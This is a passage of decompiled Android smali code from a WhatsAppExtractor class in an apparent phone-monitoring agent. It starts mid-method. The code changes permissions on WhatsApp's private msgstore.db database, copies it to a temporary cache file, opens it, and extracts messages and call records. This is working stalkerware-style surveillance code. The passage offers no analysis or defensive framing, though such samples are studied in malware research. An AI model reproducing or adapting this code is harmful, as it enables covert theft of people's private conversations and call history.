    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    const-string v3, " to: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {p1, p2, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p1

    .line 221
    iget-object p2, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    const-string v2, "Error extracting data."

    invoke-interface {p2, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 223
    iget-object p1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string p2, "wa_max_id"

    invoke-virtual {p1, p2, v0}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/Integer;)V

    return-void
.end method

.method protected isReadable(Ljava/lang/String;)Z
    .locals 2

    const/4 v0, 0x0

    .line 307
    :try_start_0
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-nez v1, :cond_0

    return v0

    .line 317
    :cond_0
    invoke-virtual {v1}, Ljava/io/File;->canRead()Z

    move-result p1

    return p1

    :catch_0
    return v0
.end method

.method protected prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;
    .locals 4

    const/4 v0, 0x0

    .line 356
    :try_start_0
    invoke-virtual {p0, p1, p2}, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->copy(Ljava/io/File;Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 370
    :try_start_1
    invoke-virtual {p2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object p1

    const/16 v1, 0x10

    invoke-static {p1, v0, v1}, Landroid/database/sqlite/SQLiteDatabase;->openDatabase(Ljava/lang/String;Landroid/database/sqlite/SQLiteDatabase$CursorFactory;I)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object p1
    :try_end_1
    .catch Landroid/database/sqlite/SQLiteException; {:try_start_1 .. :try_end_1} :catch_0

    return-object p1

    :catch_0
    move-exception p1

    .line 373
    iget-object v1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "WAExtractor"

    const-string v3, "Exception caught while opening database."

    invoke-interface {v1, v2, v3, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 374
    invoke-virtual {p2}, Ljava/io/File;->delete()Z

    return-object v0

    :catch_1
    move-exception p1

    .line 358
    iget-object p2, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    const-string v2, "prepareDatabase(): Exception caught during coping database to a temporary location."

    invoke-interface {p2, v1, v2, p1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-object v0
.end method

.method public run()V
    .locals 7

    const-string v0, "waMsgTemp"

    .line 55
    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->cleanTempFilesFromPreviousInvocations(Ljava/lang/String;)V

    const-string v0, "/data/data/com.whatsapp/databases/"

    .line 62
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "/msgstore.db"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x2

    .line 64
    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    aput-object v0, v2, v3

    const/4 v0, 0x1

    aput-object v1, v2, v0

    .line 69
    array-length v0, v2

    :goto_0
    if-ge v3, v0, :cond_1

    aget-object v4, v2, v3

    .line 70
    invoke-virtual {p0, v4}, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->isReadable(Ljava/lang/String;)Z

    move-result v5

    if-nez v5, :cond_0

    .line 71
    invoke-virtual {p0, v4}, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->chmod(Ljava/lang/String;)Z

    :cond_0
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    .line 79
    :cond_1
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, v1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    .line 81
    invoke-virtual {v0}, Ljava/io/File;->isFile()Z

    move-result v1

    const/4 v2, 0x3

    if-nez v1, :cond_2

    .line 82
    iget-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    const-string v3, "Database file is not a file."

    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 87
    :cond_2
    invoke-virtual {v0}, Ljava/io/File;->exists()Z

    move-result v1

    if-nez v1, :cond_3

    .line 88
    iget-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    const-string v3, "Database file does not exist."

    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    .line 93
    :cond_3
    invoke-virtual {v0}, Ljava/io/File;->length()J

    move-result-wide v3

    const-wide/16 v5, 0x0

    cmp-long v1, v3, v5

    if-nez v1, :cond_4

    .line 94
    iget-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    const-string v3, "Database file is 0L long."

    invoke-interface {v0, v1, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :cond_4
    const/4 v1, 0x0

    :try_start_0
    const-string v3, "waMsgTemp"

    const-string v4, "db"

    .line 107
    iget-object v5, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->context:Lcom/hp/vd/context/Context;

    .line 110
    invoke-virtual {v5}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-virtual {v5}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/File;->getAbsoluteFile()Ljava/io/File;

    move-result-object v5

    .line 107
    invoke-static {v3, v4, v5}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v3
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez v3, :cond_5

    .line 114
    :try_start_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    const-string v4, "Could not create the temporary database."

    invoke-interface {v0, v1, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return-void

    :catch_0
    move-exception v0

    goto :goto_1

    .line 119
    :cond_5
    invoke-virtual {p0, v0, v3}, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->prepareDatabase(Ljava/io/File;Ljava/io/File;)Landroid/database/sqlite/SQLiteDatabase;

    move-result-object v0

    if-nez v0, :cond_6

    .line 122
    iget-object v0, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "WAExtractor"

    const-string v4, "Could not open the temporary database."

    invoke-interface {v0, v1, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    .line 124
    invoke-virtual {v3}, Ljava/io/File;->delete()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    return-void

    .line 138
    :cond_6
    invoke-virtual {p0, v3, v0}, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->extractMessages(Ljava/io/File;Landroid/database/sqlite/SQLiteDatabase;)V

    .line 139
    invoke-virtual {p0, v3, v0}, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->extractCalls(Ljava/io/File;Landroid/database/sqlite/SQLiteDatabase;)V

    .line 141
    invoke-virtual {v0}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    .line 142
    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    return-void

    :catch_1
    move-exception v0

    move-object v3, v1

    .line 129
    :goto_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/whatsapp/WhatsAppExtractor;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "WAExtractor"

    const-string v4, "Exception caught during CALL extraction."

    invoke-interface {v1, v2, v4, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    if-eqz v3, :cond_7

    .line 132
    invoke-virtual {v3}, Ljava/io/File;->delete()Z

    :cond_7
    return-void
.end method
